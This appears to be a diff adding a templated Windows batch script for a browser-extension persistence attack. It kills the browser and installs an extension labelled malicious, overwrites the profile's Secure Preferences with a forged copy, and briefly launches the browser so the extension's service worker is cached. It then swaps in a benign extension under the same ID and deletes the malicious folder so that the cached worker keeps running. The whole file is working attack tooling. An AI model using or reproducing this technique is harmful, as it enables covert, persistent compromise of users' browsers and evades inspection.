@@ -1,0 +1,112 @@
+@echo off
+setlocal
+
+set DEPLOY_DIR=%~dp0
+set PROFILE_PATH=%LOCALAPPDATA%\{{BROWSER_PROFILE_PATH}}
+set PROC_NAME={{BROWSER_PROC_NAME}}
+set BROWSER_TARGET_DIR={{BROWSER_TARGET_DIR}}
+
+set CLEAN_PREFS=%DEPLOY_DIR%SecurePreferencesClean
+set PREFS_MALICIOUS=%DEPLOY_DIR%Secure Preferences A
+set PREFS_BENIGN=%DEPLOY_DIR%Secure Preferences B
+
+REM Sanity checks
+if not exist "%CLEAN_PREFS%" (
+    echo [!] SecurePreferencesClean not found
+    exit /b 1
+)
+if not exist "%PREFS_MALICIOUS%" (
+    echo [!] Secure Preferences A not found
+    exit /b 1
+)
+if not exist "%PREFS_BENIGN%" (
+    echo [!] Secure Preferences B not found
+    exit /b 1
+)
+if not exist "%DEPLOY_DIR%extension_malicious\manifest.json" (
+    echo [!] extension_malicious folder not found
+    exit /b 1
+)
+if not exist "%DEPLOY_DIR%extension_benign\manifest.json" (
+    echo [!] extension_benign folder not found
+    exit /b 1
+)
+
+REM ============================================================
+REM Phase 1 - deploy malicious extension A, then cache its worker
+REM ============================================================
+
+REM Kill browser
+echo [*] Killing %PROC_NAME% ...
+taskkill /F /IM "%PROC_NAME%" 2>nul
+timeout /t 2 /nobreak >nul
+
+REM Restore clean Secure Preferences
+REM echo [*] Restoring clean Secure Preferences...
+REM copy /Y "%CLEAN_PREFS%" "%PROFILE_PATH%\Secure Preferences"
+REM if errorlevel 1 (
+REM    echo [!] Failed to restore clean Secure Preferences
+REM    exit /b 1
+REM )
+
+REM Copy malicious extension A
+echo [*] Copying malicious extension to %BROWSER_TARGET_DIR%\{{MALICIOUS_NAME}}...
+xcopy /E /I /Y "%DEPLOY_DIR%extension_malicious" "%BROWSER_TARGET_DIR%\{{MALICIOUS_NAME}}" >nul
+if errorlevel 1 (
+    echo [!] Failed to copy malicious extension
+    exit /b 1
+)
+
+REM Re-kill the browser before touching Secure Preferences, in case it respawned
+REM taskkill /F /IM "%PROC_NAME%" 2>nul
+REM timeout /t 1 /nobreak >nul
+
+REM Drop Secure Preferences A (malicious)
+echo [*] Overwriting Secure Preferences with the malicious variant...
+copy /Y "%PREFS_MALICIOUS%" "%PROFILE_PATH%\Secure Preferences"
+if errorlevel 1 (
+    echo [!] Failed to overwrite Secure Preferences with the malicious variant
+    exit /b 1
+)
+
+REM Open then close the browser so A's service worker is cached in ScriptCache.
+REM This step is MANDATORY for GAP persistence.
+echo [*] Opening {{BROWSER_NAME}} to cache the service worker...
+start "" "%PROC_NAME%"
+timeout /t 12 /nobreak >nul
+taskkill /F /IM "%PROC_NAME%" 2>nul
+timeout /t 1 /nobreak >nul
+
+REM ============================================================
+REM Phase 2 - stomp with benign extension B, same extension ID
+REM ============================================================
+
+REM Copy benign extension B
+echo [*] Copying benign extension to %BROWSER_TARGET_DIR%\{{BENIGN_NAME}}...
+xcopy /E /I /Y "%DEPLOY_DIR%extension_benign" "%BROWSER_TARGET_DIR%\{{BENIGN_NAME}}" >nul
+if errorlevel 1 (
+    echo [!] Failed to copy benign extension
+    exit /b 1
+)
+
+REM Re-kill the browser before touching Secure Preferences (it can respawn)
+taskkill /F /IM "%PROC_NAME%" 2>nul
+timeout /t 1 /nobreak >nul
+
+REM Drop Secure Preferences B (benign)
+echo [*] Overwriting Secure Preferences with the benign variant...
+copy /Y "%PREFS_BENIGN%" "%PROFILE_PATH%\Secure Preferences"
+if errorlevel 1 (
+    echo [!] Failed to overwrite Secure Preferences with the benign variant
+    exit /b 1
+)
+
+REM Remove malicious folder A so only the benign folder remains on disk
+if /i not "{{MALICIOUS_NAME}}"=="{{BENIGN_NAME}}" (
+    echo [*] Removing malicious extension folder...
+    rmdir /S /Q "%BROWSER_TARGET_DIR%\{{MALICIOUS_NAME}}" 2>nul
+)
+
+echo [+] Done. Launch {{BROWSER_NAME}} - the cached malicious worker will execute.
+endlocal
+
